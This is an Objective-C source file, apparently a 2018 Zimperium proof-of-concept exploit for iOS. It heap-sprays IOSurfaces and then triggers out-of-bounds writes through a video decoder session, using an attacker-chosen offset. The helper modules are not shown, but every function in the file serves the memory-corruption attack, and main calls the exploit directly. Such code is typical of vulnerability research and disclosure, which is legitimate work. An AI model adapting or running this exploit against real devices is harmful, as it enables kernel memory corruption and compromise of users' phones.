//
//  main.m
//
//  Created by Adam
//  Copyright © 2018 Zimperium. All rights reserved.
//

//#import <UIKit/UIKit.h>
#import <pthread.h>

#include "main.h"
#include "log.h"
#include "video_decoder.h"
#include "heap_spray.h"

/*
 * Function name: 	write_oob
 * Description:		Writes out of bound for the mapping of the specified IOSurface, by the specified offset.
 * Returns:			OSStatus.
 */

static
OSStatus write_oob(uint32_t surface_id, int offset) {

    OSStatus ret = noErr;
    decoding_session_t session = {
            .video_description = NULL,
            .decoder_session = NULL
    };

    DEBUG_LOG("offset: 0x%0x", offset);

    ret = (kern_return_t)video_decoder_create_session(&session);
    if (ret)
    {
        ERROR_LOG("error creating a decoding session");
        goto cleanup;
    }

    ret = video_decoder_write_oob(&session, offset, surface_id);

cleanup:

    //video_decoder_cleanup_session(&session);
    return ret;
}

/*
 * Function name:       exploit
 * Description:         The actual entry point for the exploit.
 * Returns:             0 for success, otherwise an error code (most likely kern_return_t).
 */

int exploit() {

    kern_return_t ret = KERN_SUCCESS;
    uint32_t surface_id = 0;
    uint32_t i = 0;

    ret = heap_spray_init();
    if (KERN_SUCCESS != ret)
    {
        ERROR_LOG("error initializing spray");
        goto cleanup;
    }

    ret = heap_spray_start_spraying();
    if (KERN_SUCCESS != ret)
    {
        ERROR_LOG("spraying failed");
        goto cleanup;
    }

    DEBUG_LOG("Writing OOB");
    for(i = 0; i < NUMBER_OF_SURFACES_TO_SPRAY; ++i) {
        surface_id = heap_spray_get_sprayed_surface_id(i);
        DEBUG_LOG("i = %d, surface_id = %d", i, surface_id);
        if (((NUMBER_OF_SURFACES_TO_SPRAY)*80)/100 <= i)
        {
            ret = write_oob(surface_id, 0x41414141);
        } else {
            ret = write_oob(surface_id, 0);
        }
        if (noErr != ret)
        {
            ERROR_LOG("Error writing OOB");
            goto cleanup;
        }
    }
    DEBUG_LOG("Wrote OOB");


cleanup:
    heap_spray_start_spraying();
    getchar();
    heap_spray_cleanup();
    return ret;
}


int main() {

    kern_return_t ret = KERN_SUCCESS;
    DEBUG_LOG("Welcome");

    ret = exploit();

    return ret;
}
